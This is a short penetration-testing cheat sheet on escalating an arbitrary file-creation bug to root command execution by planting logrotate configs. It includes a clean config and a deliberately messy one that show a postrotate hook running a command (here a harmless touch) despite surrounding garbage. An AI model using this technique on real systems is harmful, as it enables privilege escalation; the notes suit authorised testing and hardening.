# Create Arbitrary File
* as root or user you can...
	* create an empty file
	* create file and control content (eg. arbitrary file upload)
	* create file and partially control content (eg. inject data into a config file)
		* control filename/path
		* partially control filename or path (eg. fixed extension)

### logrotate
* logrotate config files in `/etc/logrotate.d/<anything>`
* consideres time in `/var/lib/logrotate/status` to determin if log should be rotated (you might have to wait for two days for a new file to trigger a first rotate)
* comment lines start with `# a comment`
* newlines are required! Format is strict
* unkown commands are ignored

#### Clean File
```
/etc/debian_version {
       hourly
       copy
       ifempty
       missingok 
       postrotate /usr/bin/touch /tmp/test/testrotate 
       endscript
}
```

#### Messy File
```
text and <00><ff>binary is okay here, but must not start with a [symbol]!@#

/etc/debian_version {
       thishere must be valid word at the start. symbols can appear [later!@] but not at the start!
       # a comment with # is similar to invalid command. anything can follow until newline \n (even binary)
       hourly
       copy
       ifempty
       missingok 
       postrotate /usr/bin/touch /tmp/test/testrotate 
       endscript
}

# comment here
xxxx {
asdas
}

[we]! can have symbols and garbage at the end
<00><ff> binary also ok here
```